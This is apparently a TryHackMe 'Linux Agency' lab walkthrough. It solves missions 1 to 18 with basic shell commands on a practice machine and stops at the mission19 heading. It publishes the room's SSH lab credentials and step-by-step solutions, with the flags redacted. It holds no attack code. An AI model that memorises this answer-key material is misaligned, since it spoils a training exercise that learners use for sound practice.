# Linux Agency

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Medium
Tags: Linux
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
This Room will help you to sharpen your Linux Skills and help you to learn basic privilege escalation 
in a HITMAN theme. So, pack your briefcase and grab your SilverBallers as its gonna be a tough ride.
```

Room link: [https://tryhackme.com/room/linuxagency](https://tryhackme.com/room/linuxagency)

## Solution

### Task 1: Deploy The Machine

#### Set up your virtual environment

To successfully complete this room, you'll need to set up your virtual environment. This involves starting both your AttackBox (if you're not using your VPN) and Lab Machines, ensuring you're equipped with the necessary tools and access to tackle the challenges ahead.

Welcome to Linux Agency. Agent 47, this is where you will need to go through several tests concerning linux fundamentals and privilege escalation techniques.

This room is proudly made by [0z09e](https://twitter.com/0z09e) and [Xyan1d3](https://twitter.com/xyan1d3)

If you enjoy this room, please let us know by tagging us on Twitter. You may also contact us in case of some unintended routes or bugs, and we will be happy to resolve them.

---------------------------------------------------------------------------------------

### Task 2: Let's just jump in

Please wait about 1 minute before SSH'ing into the box.

- SSH Username : `agent47`
- SSH Password : `640509040147`

Each flag found will serve as the password for the next user. The flag includes the username of the next user that is part of this challenge. The Flag format is : `username{md5sum}`

The order of users: agent47 --> mission1 --> mission30 will be part of Task 3: Linux Fundamentals.

After those missions, the next levels will be in Task 4: Privilege Escalation.

---------------------------------------------------------------------------------------

#### SSH into the box as agent47

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Agency]
└─$ export TARGET_IP=10.114.156.65 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Agency]
└─$ ssh agent47@$TARGET_IP   
The authenticity of host '10.114.156.65 (10.114.156.65)' can't be established.
ED25519 key fingerprint is SHA256:FaS8GFNr+3UXf7F3dwtW1e3iN+IHyDOiulUbd7gptO4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.114.156.65' (ED25519) to the list of known hosts.
agent47@10.114.156.65's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

mission1{<REDACTED>}
agent47@linuxagency:~$ 
```

---------------------------------------------------------------------------------------

### Task 3: Linux Fundamentals

Agent 47, we are ICA, the Linux Agency. We will test your Linux Fundamentals. Let's see if you can pass all these challenges of basic Linux. The password of the next mission will be the flag of that mission. Example: `mission1{1234567890}` will be the password for the mission1 user.

#### Mission Active

---------------------------------------------------------------------------------------

#### What is the mission1 flag?

The mission1 flag was displayed in the SSH banner when we logged in.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Agency]
└─$ ssh agent47@$TARGET_IP   
The authenticity of host '10.114.156.65 (10.114.156.65)' can't be established.

<---snip---->

0 packages can be updated.
0 updates are security updates.

mission1{<REDACTED>}               <---- here
agent47@linuxagency:~$ 
```

Answer: `mission1{<REDACTED>}`

#### What is the mission2 flag?

Hint: Don't forget to bring the groceries, the list is inside your bag.

```bash
agent47@linuxagency:~$ su mission1
Password: 
mission1@linuxagency:/home/agent47$ cd ../mission1
mission1@linuxagency:~$ ls -la
total 16
drwxr-x---  2 mission1 mission1 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission1 mission1    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission1 mission1 3771 Jan 12  2021 .bashrc
-r--------  1 mission1 mission1    0 Jan 12  2021 mission2{<REDACTED>}
-rw-r--r--  1 mission1 mission1  807 Jan 12  2021 .profile
mission1@linuxagency:~$ 
```

Answer: `mission2{<REDACTED>}`

#### What is the mission3 flag?

Hint: I love Tom from "Tom and Jerry Show"

```bash
mission1@linuxagency:~$ su mission2
Password: 
mission2@linuxagency:/home/mission1$ cd ../mission2
mission2@linuxagency:~$ ls -la
total 28
drwxr-x---  3 mission2 mission2 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission2 mission2    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission2 mission2 3771 Jan 12  2021 .bashrc
-r--------  1 mission2 mission2   43 Jan 12  2021 flag.txt
drwxr-xr-x  3 mission2 mission2 4096 Jan 12  2021 .local
-rw-r--r--  1 mission2 mission2  807 Jan 12  2021 .profile
-rw-------  1 mission2 mission2  726 Jan 12  2021 .viminfo
mission2@linuxagency:~$ cat flag.txt 
mission3{<REDACTED>}
mission2@linuxagency:~$ 
```

Answer: `mission3{<REDACTED>}`

#### What is the mission4 flag?

Hint: Maybe you are too feline

```bash
mission2@linuxagency:~$ su mission3
Password: 
mission3@linuxagency:/home/mission2$ cd ../mission3
mission3@linuxagency:~$ ls -la
total 28
drwxr-x---  3 mission3 mission3 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission3 mission3    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission3 mission3 3771 Jan 12  2021 .bashrc
-r--------  1 mission3 mission3  101 Jan 12  2021 flag.txt
-rw-------  1 mission3 mission3   34 Jan 12  2021 .lesshst
drwxr-xr-x  3 mission3 mission3 4096 Jan 12  2021 .local
-rw-r--r--  1 mission3 mission3  807 Jan 12  2021 .profile
mission3@linuxagency:~$ cat flag.txt 
I am really sorry man the flag is stolen by some thief's.
mission3@linuxagency:~$
```

Nope, not that easy. We can show non-printable characters with the `-v` parameter to `cat`. Let's check that.

```bash
mission3@linuxagency:~$ cat -v flag.txt 
mission4{<REDACTED>}^MI am really sorry man the flag is stolen by some thief's.
mission3@linuxagency:~$ 
```

And there we have the flag!

Answer: `mission4{<REDACTED>}`

#### What is the mission5 flag?

Hint: Sometime's Its just better to barge in, Instead of knocking ;)

```bash
mission3@linuxagency:~$ su mission4
Password: 
mission4@linuxagency:/home/mission3$ cd ../mission4
mission4@linuxagency:~$ ls -la
total 20
drwxr-x---  3 mission4 mission4 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission4 mission4    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission4 mission4 3771 Jan 12  2021 .bashrc
drwxr-xr-x  2 mission4 mission4 4096 Jan 12  2021 flag
-rw-r--r--  1 mission4 mission4  807 Jan 12  2021 .profile
mission4@linuxagency:~$ cd flag
mission4@linuxagency:~/flag$ ls -la
total 12
drwxr-xr-x 2 mission4 mission4 4096 Jan 12  2021 .
drwxr-x--- 3 mission4 mission4 4096 Jan 12  2021 ..
-r-------- 1 mission4 mission4   43 Jan 12  2021 flag.txt
mission4@linuxagency:~/flag$ cat flag.txt 
mission5{<REDACTED>}
mission4@linuxagency:~/flag$ 
```

Answer: `mission5{<REDACTED>}`

#### What is the mission6 flag?

Hint: You will need your 6th sense here

```bash
mission4@linuxagency:~/flag$ cd ..
mission4@linuxagency:~$ su mission5
Password: 
mission5@linuxagency:/home/mission4$ cd ../mission5
mission5@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission5 mission5 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission5 mission5    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission5 mission5 3771 Jan 12  2021 .bashrc
-r--------  1 mission5 mission5   43 Jan 12  2021 .flag.txt
-rw-r--r--  1 mission5 mission5  807 Jan 12  2021 .profile
mission5@linuxagency:~$ cat .flag.txt 
mission6{<REDACTED>}
mission5@linuxagency:~$ 
```

Answer: `mission6{<REDACTED>}`

#### What is the mission7 flag?

```bash
mission5@linuxagency:~$ su mission6
Password: 
mission6@linuxagency:/home/mission5$ cd ../mission6
mission6@linuxagency:~$ ls -la
total 20
drwxr-x---  3 mission6 mission6 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission6 mission6    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission6 mission6 3771 Jan 12  2021 .bashrc
drwxr-xr-x  2 mission6 mission6 4096 Jan 12  2021 .flag
-rw-r--r--  1 mission6 mission6  807 Jan 12  2021 .profile
mission6@linuxagency:~$ cd .flag
mission6@linuxagency:~/.flag$ ls -la
total 12
drwxr-xr-x 2 mission6 mission6 4096 Jan 12  2021 .
drwxr-x--- 3 mission6 mission6 4096 Jan 12  2021 ..
-r-------- 1 mission6 mission6   43 Jan 12  2021 flag.txt
mission6@linuxagency:~/.flag$ cat flag.txt 
mission7{<REDACTED>}
mission6@linuxagency:~/.flag$ 
```

Answer: `mission7{<REDACTED>}`

#### What is the mission8 flag?

Hint: Maybe you accidentally got into your neighbor's house.

```bash
mission6@linuxagency:~/.flag$ cd ..
mission6@linuxagency:~$ su mission7
Password: 
bash: /home/mission6/.bashrc: Permission denied
mission7@linuxagency:~$ pwd
/home/mission6
mission7@linuxagency:~$ cd ../mission7
mission7@linuxagency:/home/mission7$ ls -la
total 20
drwxr-x---  2 mission7 mission7 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission7 mission7    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission7 mission7 3771 Jan 12  2021 .bashrc
-r--------  1 mission7 mission7   43 Jan 12  2021 flag.txt
-rw-r--r--  1 mission7 mission7  807 Jan 12  2021 .profile
mission7@linuxagency:/home/mission7$ cat flag.txt 
mission8{<REDACTED>}
mission7@linuxagency:/home/mission7$ 
```

Answer: `mission8{<REDACTED>}`

#### What is the mission9 flag?

Hint: Time to meet your great grandparents.

```bash
mission7@linuxagency:/home/mission7$ su mission8
Password: 
mission8@linuxagency:/home/mission7$ cd ../mission8
mission8@linuxagency:~$ ls -la
total 16
drwxr-x---  2 mission8 mission8 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission8 mission8    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission8 mission8 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission8 mission8  807 Jan 12  2021 .profile
mission8@linuxagency:~$ cd ..
mission8@linuxagency:/home$ ls -la
total 180
drwxr-xr-x 45 root      root      4096 Jan 12  2021 .
drwxr-xr-x 24 root      root      4096 Jan 12  2021 ..
drwxr-x---  2 0z09e     0z09e     4096 Jan 12  2021 0z09e
drwxr-x--- 13 agent47   agent47   4096 Jan 15  2021 agent47
drwxr-x---  2 dalia     dalia     4096 Jan 12  2021 dalia
drwxr-x---  2 diana     diana     4096 Jan 12  2021 diana
drwxr-x---  3 jordan    jordan    4096 Jan 12  2021 jordan
drwxr-x---  2 ken       ken       4096 Jan 12  2021 ken
drwxr-x---  5 maya      maya      4096 Jan 15  2021 maya
drwxr-x---  2 mission1  mission1  4096 Jan 12  2021 mission1
drwxr-x---  4 mission10 mission10 4096 Jan 12  2021 mission10
drwxr-x---  3 mission11 mission11 4096 Jan 12  2021 mission11
drwxr-x---  2 mission12 mission12 4096 Jan 12  2021 mission12
drwxr-x---  3 mission13 mission13 4096 Jan 12  2021 mission13
drwxr-x---  2 mission14 mission14 4096 Jan 12  2021 mission14
drwxr-x---  2 mission15 mission15 4096 Jan 12  2021 mission15
drwxr-x---  2 mission16 mission16 4096 Jan 12  2021 mission16
drwxr-x---  2 mission17 mission17 4096 Jan 12  2021 mission17
drwxr-x---  2 mission18 mission18 4096 Jan 12  2021 mission18
drwxr-x---  2 mission19 mission19 4096 Jan 12  2021 mission19
drwxr-x---  3 mission2  mission2  4096 Jan 12  2021 mission2
drwxr-x---  2 mission20 mission20 4096 Jan 12  2021 mission20
drwxr-x---  3 mission21 mission21 4096 Jan 12  2021 mission21
drwxr-x---  2 mission22 mission22 4096 Jan 12  2021 mission22
drwxr-x---  3 mission23 mission23 4096 Jan 15  2021 mission23
drwxr-x---  3 mission24 mission24 4096 Feb  1  2021 mission24
drwxr-x---  3 mission25 mission25 4096 Jan 12  2021 mission25
drwxr-x---  2 mission26 mission26 4096 Jan 12  2021 mission26
drwxr-x---  2 mission27 mission27 4096 Jan 12  2021 mission27
drwxr-x---  3 mission28 mission28 4096 Jan 12  2021 mission28
drwxr-x---  3 mission29 mission29 4096 Jan 12  2021 mission29
drwxr-x---  3 mission3  mission3  4096 Jan 12  2021 mission3
drwxr-x---  3 mission30 mission30 4096 Jan 12  2021 mission30
drwxr-x---  3 mission4  mission4  4096 Jan 12  2021 mission4
drwxr-x---  2 mission5  mission5  4096 Jan 12  2021 mission5
drwxr-x---  3 mission6  mission6  4096 Jan 12  2021 mission6
drwxr-x---  2 mission7  mission7  4096 Jan 12  2021 mission7
drwxr-x---  2 mission8  mission8  4096 Jan 12  2021 mission8
drwxr-x---  2 mission9  mission9  4096 Jan 12  2021 mission9
drwxr-x---  3 penelope  penelope  4096 Jan 12  2021 penelope
drwxr-x---  3 reza      reza      4096 Jan 12  2021 reza
drwxr-x---  2 sean      sean      4096 Jan 12  2021 sean
drwxr-x---  3 silvio    silvio    4096 Jan 12  2021 silvio
drwxr-x---  5 viktor    viktor    4096 Jan 12  2021 viktor
drwxr-x---  2 xyan1d3   xyan1d3   4096 Jan 12  2021 xyan1d3
mission8@linuxagency:/home$ cd ..
mission8@linuxagency:/$ ls -la
total 483920
drwxr-xr-x  24 root     root          4096 Jan 12  2021 .
drwxr-xr-x  24 root     root          4096 Jan 12  2021 ..
drwxr-xr-x   2 root     root          4096 Jan 12  2021 bin
drwxr-xr-x   3 root     root          4096 Jan 12  2021 boot
drwxrwxr-x   2 root     root          4096 Jan 12  2021 cdrom
drwxr-xr-x  15 root     root          3700 Aug 25 03:50 dev
drwxr-xr-x 126 root     root         12288 Feb  1  2021 etc
-r--------   1 mission8 mission8        43 Jan 12  2021 flag.txt
drwxr-xr-x  45 root     root          4096 Jan 12  2021 home
lrwxrwxrwx   1 root     root            33 Jan 12  2021 initrd.img -> boot/initrd.img-4.15.0-20-generic
lrwxrwxrwx   1 root     root            33 Jan 12  2021 initrd.img.old -> boot/initrd.img-4.15.0-20-generic
drwxr-xr-x  22 root     root          4096 Jan 12  2021 lib
drwxr-xr-x   2 root     root          4096 Apr 26  2018 lib64
drwx------   2 root     root         16384 Jan 12  2021 lost+found
drwxr-xr-x   3 root     root          4096 Apr 26  2018 media
drwxr-xr-x   2 root     root          4096 Apr 26  2018 mnt
drwxr-xr-x   4 root     root          4096 Jan 12  2021 opt
dr-xr-xr-x 130 root     root             0 Aug 25 03:50 proc
drwx------   5 root     root          4096 Feb  1  2021 root
drwxr-xr-x  27 root     root           860 Aug 25 03:57 run
drwxr-xr-x   2 root     root         12288 Jan 12  2021 sbin
drwxr-xr-x   9 root     root          4096 Jan 12  2021 snap
drwxr-xr-x   2 root     root          4096 Apr 26  2018 srv
-rw-------   1 root     root     495416320 Jan 12  2021 swapfile
dr-xr-xr-x  13 root     root             0 Aug 25 03:50 sys
drwxrwxrwt  10 root     root          4096 Aug 25 04:31 tmp
drwxr-xr-x  10 root     root          4096 Apr 26  2018 usr
drwxr-xr-x  15 root     root          4096 Jan 12  2021 var
lrwxrwxrwx   1 root     root            30 Jan 12  2021 vmlinuz -> boot/vmlinuz-4.15.0-20-generic
mission8@linuxagency:/$ cat flag.txt 
mission9{<REDACTED>}
mission8@linuxagency:/$ 
```

Answer: `mission9{<REDACTED>}`

#### What is the mission10 flag?

```bash
mission8@linuxagency:/$ cd /home
mission8@linuxagency:/home$ su mission9
Password: 
mission9@linuxagency:/home$ cd mission9
mission9@linuxagency:~$ ls -la
total 136664
drwxr-x---  2 mission9 mission9      4096 Jan 12  2021 .
drwxr-xr-x 45 root     root          4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission9 mission9         9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission9 mission9      3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission9 mission9       807 Jan 12  2021 .profile
-r--------  1 mission9 mission9 139921551 Jan 12  2021 rockyou.txt
mission9@linuxagency:~$ grep mission10 rockyou.txt 
mission101
mission10
mission10{<REDACTED>}
mission1098
mission108
mission9@linuxagency:~$ 
```

Answer: `mission10{<REDACTED>}`

#### What is the mission11 flag?

Hint: Your need to finD some way to reverse a binary tree.

```bash
mission9@linuxagency:~$ su mission10
Password: 
mission10@linuxagency:/home/mission9$ cd ../mission10
mission10@linuxagency:~$ ls -la
total 24
drwxr-x---  4 mission10 mission10 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission10 mission10    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission10 mission10 3771 Jan 12  2021 .bashrc
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 folder
drwxr-xr-x  3 mission10 mission10 4096 Jan 12  2021 .local
-rw-r--r--  1 mission10 mission10  807 Jan 12  2021 .profile
mission10@linuxagency:~$ cd folder
mission10@linuxagency:~/folder$ ls -la
total 48
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 .
drwxr-x---  4 mission10 mission10 4096 Jan 12  2021 ..
drwxr-xr-x  2 mission10 mission10 4096 Jan 12  2021 L4D1
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D10
drwxr-xr-x  2 mission10 mission10 4096 Jan 12  2021 L4D2
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D3
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D4
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D5
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D6
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D7
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D8
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D9
mission10@linuxagency:~/folder$ find . -name flag.txt
./L4D8/L3D7/L2D2/L1D10/flag.txt
mission10@linuxagency:~/folder$ cat ./L4D8/L3D7/L2D2/L1D10/flag.txt
mission11{<REDACTED>}
mission10@linuxagency:~/folder$ 
```

Answer: `mission11{<REDACTED>}`

#### What is the mission12 flag?

Hint: Maybe it is time to study some EVs.

```bash
mission10@linuxagency:~/folder$ cd ..
mission10@linuxagency:~$ su mission11
Password: 
mission11@linuxagency:/home/mission10$ cd ../mission11
mission11@linuxagency:~$ ls -la
total 20
drwxr-x---  3 mission11 mission11 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission11 mission11    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission11 mission11 3963 Jan 12  2021 .bashrc
drwxr-xr-x  3 mission11 mission11 4096 Jan 12  2021 .local
-rw-r--r--  1 mission11 mission11  807 Jan 12  2021 .profile
mission11@linuxagency:~$ env
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.152.166 55900 10.114.156.65 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
XDG_SESSION_ID=15
USER=mission11
PWD=/home/mission11
HOME=/home/mission11
SSH_CLIENT=192.168.152.166 55900 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_TTY=/dev/pts/0
MAIL=/var/mail/mission11
FLAG=mission12{<REDACTED>}
SHELL=/bin/bash
TERM=xterm-256color
flag=mission12{<REDACTED>}
SHLVL=12
LOGNAME=mission11
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
LESSOPEN=| /usr/bin/lesspipe %s
OLDPWD=/home/mission10
_=/usr/bin/env
mission11@linuxagency:~$ 
```

Answer: `mission12{<REDACTED>}`

#### What is the mission13 flag?

Hint: You have failed in your previous exam. So, access denied from gaming.

```bash
mission11@linuxagency:~$ su mission12
Password: 
mission12@linuxagency:/home/mission11$ cd ../mission12
mission12@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission12 mission12 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission12 mission12    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission12 mission12 3771 Jan 12  2021 .bashrc
----------  1 mission12 mission12   44 Jan 12  2021 flag.txt
-rw-r--r--  1 mission12 mission12  807 Jan 12  2021 .profile
mission12@linuxagency:~$ chmod 400 flag.txt 
mission12@linuxagency:~$ cat flag.txt 
mission13{<REDACTED>}
mission12@linuxagency:~$ 
```

Answer: `mission13{<REDACTED>}`

#### What is the mission14 flag?

Hint: 8m x 8m pillars are always strong for building a good base of a building.

```bash
mission12@linuxagency:~$ su mission13
Password: 
mission13@linuxagency:/home/mission12$ cd ../mission13
mission13@linuxagency:~$ ls -la
total 28
drwxr-x---  3 mission13 mission13 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission13 mission13    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission13 mission13 3771 Jan 12  2021 .bashrc
-r--------  1 mission13 mission13   61 Jan 12  2021 flag.txt
drwxr-xr-x  3 mission13 mission13 4096 Jan 12  2021 .local
-rw-r--r--  1 mission13 mission13  807 Jan 12  2021 .profile
-rw-------  1 mission13 mission13  978 Jan 12  2021 .viminfo
mission13@linuxagency:~$ cat flag.txt
bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=
mission13@linuxagency:~$ cat flag.txt | base64 -d
mission14{<REDACTED>}
mission13@linuxagency:~$ 
```

Answer: `mission14{<REDACTED>}`

#### What is the mission15 flag?

Hint: Some things are only made for computers.

```bash
mission13@linuxagency:~$ su mission14
Password: 
mission14@linuxagency:/home/mission13$ cd ../mission14
mission14@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission14 mission14 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission14 mission14    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission14 mission14 3771 Jan 12  2021 .bashrc
-r--------  1 mission14 mission14  345 Jan 12  2021 flag.txt
-rw-r--r--  1 mission14 mission14  807 Jan 12  2021 .profile
mission14@linuxagency:~$ cat flag.txt 
01101101011010010111001101110011011010010110111101101110001100010011010101111011011001100110001100110100001110010011000100110101011001000011100000110001001110000110001001100110011000010110010101100110011001100011000000110001001100010011100000110101011000110011001100110101001101000011011101100110001100100011010100110101001110010011011001111101
mission14@linuxagency:~$ 
```

We can use a combination of `fold`, `printf`, `while`, `read` and `xxd` convert the binary string to ASCII.

```bash
mission14@linuxagency:~$ fold -w8 flag.txt | while read -r b; do printf '%02x' "$((2#$b))"; done | xxd -r -p ;echo
mission15{<REDACTED>}
mission14@linuxagency:~$ 
```

Answer: `mission15{<REDACTED>}`

#### What is the mission16 flag?

Hint: I love honeycombs.

```bash
mission14@linuxagency:~$ su mission15
Password: 
mission15@linuxagency:/home/mission14$ cd ../mission15
mission15@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission15 mission15 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission15 mission15    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission15 mission15 3771 Jan 12  2021 .bashrc
-r--------  1 mission15 mission15   87 Jan 12  2021 flag.txt
-rw-r--r--  1 mission15 mission15  807 Jan 12  2021 .profile
mission15@linuxagency:~$ cat flag.txt 
6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D
mission15@linuxagency:~$ cat flag.txt | xxd -r -p
mission16{<REDACTED>}mission15@linuxagency:~$ cat flag.txt | xxd -r -p; echo
mission16{<REDACTED>}
mission15@linuxagency:~$ 
```

Answer: `mission16{<REDACTED>}`

#### What is the mission17 flag?

Hint: SOS! Somebody kidnapped the elves of Santa!

```bash
mission15@linuxagency:~$ su mission16
Password: 
mission16@linuxagency:/home/mission15$ cd ../mission16
mission16@linuxagency:~$ ls -la
total 28
drwxr-x---  2 mission16 mission16 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission16 mission16    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission16 mission16 3771 Jan 12  2021 .bashrc
-r--------  1 mission16 mission16 8440 Jan 12  2021 flag
-rw-r--r--  1 mission16 mission16  807 Jan 12  2021 .profile
mission16@linuxagency:~$ 
```

The flag doesn't have an extension. Let's check the file type with `file`.

```bash
mission16@linuxagency:~$ file flag 
flag: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1606102f7b80d832eabee1087180ea7ce24a96ca, not stripped
mission16@linuxagency:~$ ./flag
bash: ./flag: Permission denied
mission16@linuxagency:~$ chmod +x flag
mission16@linuxagency:~$ ./flag


mission17{<REDACTED>}

mission16@linuxagency:~$ 
```

Answer: `mission17{<REDACTED>}`

#### What is the mission18 flag?

Hint: Let's have a cup of Coffee in my office.

```bash
mission16@linuxagency:~$ su mission17
Password: 
mission17@linuxagency:/home/mission16$ cd ../mission17
mission17@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission17 mission17 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission17 mission17    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission17 mission17 3771 Jan 12  2021 .bashrc
-rwxr-xr-x  1 mission17 mission17  475 Jan 12  2021 flag.java
-rw-r--r--  1 mission17 mission17  807 Jan 12  2021 .profile
mission17@linuxagency:~$ file flag.java 
flag.java: C source, ASCII text, with CRLF line terminators
mission17@linuxagency:~$ head flag.java 
import java.util.*;
public class flag
{
    public static void main(String[] args)
    {
        String outputString="";
        String encrypted_flag="`d~~dbc<5vk=4:;=;9445;o954nil>?=lo8k:4<:h5p";
        int length = encrypted_flag.length();
        for (int i = 0 ; i < length ; i++)
        {
mission17@linuxagency:~$ 
```

We have a Java source file. To compile it, we use `javac`.

```bash
mission17@linuxagency:~$ javac flag.java 
mission17@linuxagency:~$ ls -l flag*
-rw-rw-r-- 1 mission17 mission17 1199 Aug 25 05:25 flag.class
-rwxr-xr-x 1 mission17 mission17  475 Jan 12  2021 flag.java
mission17@linuxagency:~$ 
```

Then we can execute it with `java`. Note that the `.class` extension is omiited!

```bash
mission17@linuxagency:~$ java flag
mission18{<REDACTED>}
mission17@linuxagency:~$ 
```

Answer: `mission18{<REDACTED>}`

#### What is the mission19 flag?

Hint: Maybe you will need the element which made pewdiepie's 100M subs gift from youtube.

```bash
